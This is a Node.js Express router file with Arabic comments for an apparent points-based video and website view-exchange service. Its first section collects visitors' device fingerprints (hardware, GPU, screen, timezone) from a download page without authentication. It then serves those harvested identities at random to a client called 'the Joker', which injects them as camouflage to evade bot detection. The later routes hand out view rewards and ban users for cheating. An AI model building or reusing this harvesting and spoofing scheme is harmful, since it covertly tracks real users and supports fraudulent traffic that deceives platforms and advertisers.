const express = require('express');
const mongoose = require('mongoose');
const Video = require('../models/Video');
const User = require('../models/User');
const Fingerprint = require('../models/Fingerprint'); // 👈 موديل البصمات
const { isAuth } = require('../utils/middleware');
const { rewardLimiter } = require('../utils/limiter'); // 👈 درع الحماية
const router = express.Router();

// ==================================================
// 🎣 القسم الأول: نظام الصيد والحقن (الجوكر المطور)
// ==================================================

// 1. مسار استقبال "الصيد" من صفحة التحميل (Harvest)
router.post('/harvest', async (req, res) => {
    try {
        const { fingerprint } = req.body;
        
        // معالجة قياسات الشاشة
        let screenWidth = 1920, screenHeight = 1080;
        if (fingerprint.screen && fingerprint.screen.includes('x')) {
            const parts = fingerprint.screen.split('x');
            screenWidth = parseInt(parts[0]);
            screenHeight = parseInt(parts[1]);
        }

        // إنشاء سجل جديد بالبيانات العميقة
        const newEntry = new Fingerprint({
            userAgent: fingerprint.userAgent,
            // البيانات الجديدة (العتاد)
            cpu_cores: fingerprint.cores || 8,
            ram_size: fingerprint.memory || 8,
            gpu_renderer: fingerprint.gpu || "Generic GPU",
            // بيانات الشاشة
            screen: {
                width: screenWidth,
                height: screenHeight,
                colorDepth: 24,
                pixelRatio: 1
            },
            timezone: fingerprint.timezone,
            platform: fingerprint.platform,
            // محاولة استنتاج النظام والمتصفح
            os: fingerprint.platform.includes('Win') ? 'Windows' : 'Mobile',
            browser: 'Chrome/Webview',
            canvasHash: "imported-" + Date.now() // هاش مؤقت
        });

        await newEntry.save();
        console.log("✅ New Deep Identity Captured via Telegram");
        res.json({ success: true });
    } catch (error) {
        console.error("Harvest Error:", error);
        res.status(500).json({ success: false });
    }
});

// 2. مسار إرسال الهوية للجوكر (Get Identity - النسخة العميقة)
router.get('/get-identity', isAuth, async (req, res) => {
    try {
        // نختار بصمة عشوائية
        const identity = await Fingerprint.aggregate([
            { $sample: { size: 1 } }
        ]);

        if (identity.length > 0) {
            const iden = identity[0];
            
            // نرسل البيانات العميقة ليقوم الجوكر بحقنها
            res.json({ 
                success: true, 
                data: {
                    userAgent: iden.userAgent,
                    // نرسل العتاد الحقيقي الذي تم صيده
                    cpu_cores: iden.cpu_cores || 8,
                    ram_size: iden.ram_size || 8,
                    gpu_renderer: iden.gpu_renderer || "NVIDIA GeForce RTX 3060",
                    screen: `${iden.screen.width}x${iden.screen.height}`, // إعادة تجميع الشاشة كنص
                    platform: iden.platform || "Win32",
                    vendor: "Google Inc. (NVIDIA)" // قيمة افتراضية للتمويه
                }
            });
        } else {
            // إذا كانت القاعدة فارغة
            res.json({ success: false, message: "Database empty" }); 
        }
    } catch (e) {
        console.error(e);
        res.json({ success: false });
    }
});


// ==================================================
// 📺 القسم الثاني: الفيديوهات والمكافآت (النظام القديم)
// ==================================================

// 3. جلب المهمة التالية (فيديو أو موقع)
router.get('/next-video', isAuth, async (req, res) => {
    try {
        const userId = req.session.userId;
        const mode = req.query.mode; 

        let matchQuery = { 
            active: true,
            $expr: { $lt: ["$completedViews", "$targetViews"] }
        };

        if (mode === 'website') {
            matchQuery.type = 'website';
        } else {
            matchQuery.$or = [ { type: 'video' }, { type: { $exists: false } } ];
        }

        const task = await Video.aggregate([
            { $match: matchQuery },
            { $sample: { size: 1 } }
        ]);

        if (task.length > 0) {
            res.json({ success: true, video: task[0] });
        } else {
            const msg = mode === 'website' ? 'لا توجد مواقع متاحة لزيارتها حالياً' : 'لا توجد فيديوهات متاحة للمشاهدة حالياً';
            res.json({ success: false, message: msg });
        }
    } catch (e) {
        console.error("API Error:", e);
        res.json({ success: false, message: 'خطأ في السيرفر' });
    }
});


// 4. استلام المكافأة (مع الحماية)
router.post('/reward', isAuth, rewardLimiter, async (req, res) => {
    try {
        const { videoId } = req.body;
        const viewerId = req.session.userId;
        
        if (!videoId) return res.json({ success: false });

        const video = await Video.findById(videoId);
        if (!video || !video.active) return res.json({ success: false });

        const cost = video.costPerView || 2; 
        const reward = Math.floor(cost / 2); 

        await User.findByIdAndUpdate(video.userId, { $inc: { points: -cost } });
        const viewer = await User.findByIdAndUpdate(viewerId, { $inc: { points: reward } }, { new: true });

        video.completedViews += 1;
        if (video.completedViews >= video.targetViews) {
            video.active = false; 
        }
        await video.save();

        res.json({ success: true, newPoints: viewer.points, earned: reward });
        
    } catch (e) {
        console.error("Reward Error:", e);
        res.json({ success: false });
    }
});


// 5. نظام الرعد: تقارير الغش
router.post('/report-fraud', isAuth, async (req, res) => {
    try {
        const userId = req.session.userId;
        const { reason, fingerprint } = req.body;

        const user = await User.findById(userId);
        if (!user) return res.json({ success: false });

        user.fraudStrikes += 1;
        user.deviceFingerprint = fingerprint || "Unknown";

        let action = "warning";
        let message = "";

        if (user.fraudStrikes >= 3) {
            user.isBanned = true;
            user.banReason = "تكرار الغش في المشاهدات (نظام الرعد)";
            action = "banned";
            message = "تم حظر حسابك وجهازك نهائياً بسبب تكرار انتهاك السياسات.";
        } else {
            const left = 3 - user.fraudStrikes;
            message = `لقد قمت بمحاولة تجاوز النظام. بقي لديك ${left} محاولات قبل الحظر النهائي للجهاز.`;
        }

        await user.save();

        if (user.isBanned) {
            req.session.destroy();
        }

        res.json({ success: true, action, message, strikes: user.fraudStrikes });

    } catch (e) {
        console.error(e);
        res.json({ success: false });
    }
});

module.exports = router;
